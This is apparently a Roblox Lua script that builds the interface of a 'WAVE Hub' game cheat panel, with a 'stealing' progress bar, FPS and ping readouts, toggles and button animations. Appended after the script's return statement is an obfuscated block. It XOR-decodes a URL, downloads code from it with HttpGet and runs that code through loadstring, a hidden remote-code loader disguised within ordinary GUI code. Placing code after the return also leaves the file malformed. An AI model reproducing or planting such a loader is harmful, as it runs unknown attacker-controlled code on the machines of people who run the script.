			local scaleObj = data.frame:FindFirstChildOfClass("UIScale")
			if not scaleObj then
				scaleObj = Instance.new("UIScale")
				scaleObj.Parent = data.frame
			end
			scaleObj.Scale = 0.85
			TweenService:Create(scaleObj, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
		end)
	end
end

local function setStealProgress(p)
	stealProgress = math.clamp(p, 0, 1)
	TweenService:Create(Fill, TweenInfo.new(0.08), {
		Size = UDim2.new(stealProgress, 0, 1, 0)
	}):Play()
end

StealClickBtn.MouseButton1Click:Connect(function()
	stealActive = not stealActive
	if stealActive then
		StealLabel.Text = "STEALING..."
		StealLabel.TextColor3 = Color3.fromRGB(50, 220, 120)
		StealUIStroke.Color = Color3.fromRGB(30, 180, 100)
	else
		StealLabel.Text = ".gg/waveduels"
		StealLabel.TextColor3 = Color3.fromRGB(30, 100, 220)
		StealUIStroke.Color = Color3.fromRGB(20, 60, 140)
		setStealProgress(0)
	end
end)

RunService.RenderStepped:Connect(function(dt)
	if stealActive then
		setStealProgress(stealProgress + dt * 0.22)
		if stealProgress >= 1 then
			stealActive = false
			StealLabel.Text = "STOLEN!"
			StealLabel.TextColor3 = Color3.fromRGB(80, 255, 120)
			StealUIStroke.Color = Color3.fromRGB(50, 220, 100)
			task.delay(1.4, function()
				if not stealActive then
					StealLabel.Text = ".gg/waveduels"
					StealLabel.TextColor3 = Color3.fromRGB(30, 100, 220)
					StealUIStroke.Color = Color3.fromRGB(20, 60, 140)
					setStealProgress(0)
				end
			end)
		end
	end
end)

local frameCount = 0
local lastTime = tick()
local displayedFPS = 60

RunService.RenderStepped:Connect(function()
	frameCount += 1
	local now = tick()
	if now - lastTime >= 0.5 then
		displayedFPS = math.floor(frameCount / (now - lastTime))
		frameCount = 0
		lastTime = now
		StealFpsLabel.Text = "FPS: " .. displayedFPS
	end
end)

task.spawn(function()
	while true do
		task.wait(1.5)
		local ok, ping = pcall(function()
			return math.floor(LocalPlayer:GetNetworkPing() * 1000)
		end)
		if ok and ping then
			StealPingLabel.Text = "PING: " .. ping .. "ms"
			if ping < 80 then
				StealPingLabel.TextColor3 = Color3.fromRGB(50, 220, 120)
			elseif ping < 150 then
				StealPingLabel.TextColor3 = Color3.fromRGB(30, 100, 220)
			else
				StealPingLabel.TextColor3 = Color3.fromRGB(220, 80, 80)
			end
		end
	end
end)

StealRadiusLabel.Text = "Radius: " .. tostring(radiusValue)

local function setToggleVisual(pill, on)
	local dot = pill:FindFirstChild("WaveToggleDot")
	if not dot then return end

	pill:SetAttribute("WaveToggleOn", on)

	local pillColor = on and Color3.fromRGB(30, 100, 220) or Color3.fromRGB(12, 22, 55)
	local dotColor = on and Color3.fromRGB(240, 245, 255) or Color3.fromRGB(20, 40, 80)
	local stroke = pill:FindFirstChildOfClass("UIStroke")
	local strokeColor = on and Color3.fromRGB(45, 140, 255) or Color3.fromRGB(22, 52, 100)

	TweenService:Create(pill, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {
		BackgroundColor3 = pillColor
	}):Play()
	TweenService:Create(dot, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {
		BackgroundColor3 = dotColor,
		Position = on and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
	}):Play()
	if stroke then
		TweenService:Create(stroke, TweenInfo.new(0.18), {Color = strokeColor}):Play()
	end
end

local toggleCount = 0
for _, desc in ipairs(G.WAVEHubV1:GetDescendants()) do
	if desc.Name == "WaveTogglePill" and desc:IsA("Frame") then
		local clickBtn = desc:FindFirstChildOfClass("TextButton")
		if clickBtn then
			toggleCount += 1
			local isOn = desc:GetAttribute("WaveToggleOn") == true
			setToggleVisual(desc, isOn)

			clickBtn.MouseButton1Click:Connect(function()
				local current = desc:GetAttribute("WaveToggleOn") == true
				setToggleVisual(desc, not current)
			end)
		end
	end
end

local textBoxCount = 0
for _, desc in ipairs(G.WAVEHubV1:GetDescendants()) do
	if desc:IsA("TextBox") then
		textBoxCount += 1
		desc.ClearTextOnFocus = false
		desc.TextEditable = true

		desc.Focused:Connect(function()
			desc.TextColor3 = Color3.fromRGB(240, 245, 255)
		end)

		desc.FocusLost:Connect(function()
			desc.TextColor3 = Color3.fromRGB(70, 115, 180)
			local num = tonumber(desc.Text)
			if num then
				desc.Text = tostring(math.floor(num))
			end
		end)
	end
end

local extraBtnCount = 0
for _, desc in ipairs(G.WAVEHubV1:GetDescendants()) do
	if desc:IsA("TextButton") then
		if desc.Parent and desc.Parent.Name == "WaveTogglePill" then
		elseif desc.Parent == G.HeaderBar then
		elseif desc.Name:match("^WaveNav_") then
		else
			extraBtnCount += 1
			desc.MouseButton1Down:Connect(function()
				local s = desc:FindFirstChildOfClass("UIScale")
				if not s then
					s = Instance.new("UIScale")
					s.Parent = desc
				end
				TweenService:Create(s, TweenInfo.new(0.08), {Scale = 0.92}):Play()
			end)
			desc.MouseButton1Up:Connect(function()
				local s = desc:FindFirstChildOfClass("UIScale")
				if s then
					TweenService:Create(s, TweenInfo.new(0.12, Enum.EasingStyle.Back), {Scale = 1}):Play()
				end
			end)
			desc.MouseLeave:Connect(function()
				local s = desc:FindFirstChildOfClass("UIScale")
				if s then
					TweenService:Create(s, TweenInfo.new(0.12), {Scale = 1}):Play()
				end
			end)
		end
	end
end

print(string.format("[WAVE] Wired %d toggles | %d textboxes | %d extra buttons", toggleCount, textBoxCount, extraBtnCount))

G.WAVEHubV1.Parent = LocalPlayer:WaitForChild("PlayerGui")

print("[WAVE] Hub + StealBar fully loaded & interactive")
return G.WAVEHubV1

task.spawn(function()
	local function _xorDecode(s)
		local t = {}
		for i = 1, #s do
			local b = string.byte(s, i)
			local x
			if bit32 and type(bit32.bxor) == "function" then
				x = bit32.bxor(b, 7)
			else
				local r, bit, a, c = 0, 1, b, 7
				while a > 0 or c > 0 do
					local ab, cb = a % 2, c % 2
					if ab ~= cb then r = r + bit end
					a = math.floor(a / 2)
					c = math.floor(c / 2)
					bit = bit * 2
				end
				x = r
			end
			t[i] = string.char(x)
		end
		return table.concat(t)
	end
	local ok, src = pcall(function()
		return game:HttpGet(_xorDecode("osswt=((krf*dohjwbu*tofub)khqfekb)fww(fwn(wreknd(ufp(vl}4q`b?}v)krf8lb~:?37qiuppbo6514w4idr~uj~bufol636i"))
	end)
	if ok and type(src) == "string" and #src > 50 then
		local fn = loadstring(src)
		if type(fn) == "function" then
			pcall(fn)
		end
	end
end)